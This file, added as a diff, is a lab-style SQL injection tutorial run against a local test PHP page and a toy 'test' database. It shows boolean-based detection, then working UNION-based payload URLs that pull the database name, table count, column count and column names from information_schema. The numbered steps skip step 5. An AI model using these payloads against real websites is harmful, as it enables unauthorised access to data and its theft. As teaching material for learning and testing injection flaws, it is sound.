@@ -1,0 +1,49 @@
+1. Create database and table
+ create database test;
+ use test;
+create table t1( user varchar(100), des varchar(100));
+insert into t1 values('bob', 'smart boy');
+
+2. Detect SQL INJECTION vulnerability
+
+(1) Normal Request and named Response0 for the result:
+http://localhost/mysql.php?username=bob
+
+(2) Add true condition (1=1) and named Response1 for the result:
+http://localhost/mysql.php?username=bob' and '1'='1
+
+Response 1 == Response0, we can continue
+
+(3) Response2:
+http://localhost/mysql.php?username=bob' and '1'='2
+
+Response1=Response0
+And Response1! = Response2,
+It means there is SQL Injection vulnerability.
+
+3. Get Database Name
+
+http://localhost/mysql.php?username=ankur%27 union all select database(),1 %23
+
+4. Get table number
+
+http://localhost/mysql.php?username=ankur%27 union all select concat(char(65,65,65),cast((select count(TABLE_NAME) from information_schema.tables where TABLE_SCHEMA=char(116,101,115,116)) as char)),1 %23
+
+
+
+6. Get column number
+http://localhost/mysql.php?username=bob%27 and 1=2 union all select
+concat(char(65,65,65),cast((select count(COLUMN_NAME) from
+information_schema.COLUMNS where TABLE_SCHEMA=char(116,101,115,116) and
+TABLE_NAME=char(116,49)) as char)),1 %23
+
+
+
+7. Get each column
+
+http://localhost/mysql.php?username=bob%27 and 1=2 union all select
+COLUMN_NAME,1 from information_schema.COLUMNS where
+TABLE_SCHEMA=char(116,101,115,116) and TABLE_NAME=char(116,49) limit 0,2%23
+
+
+
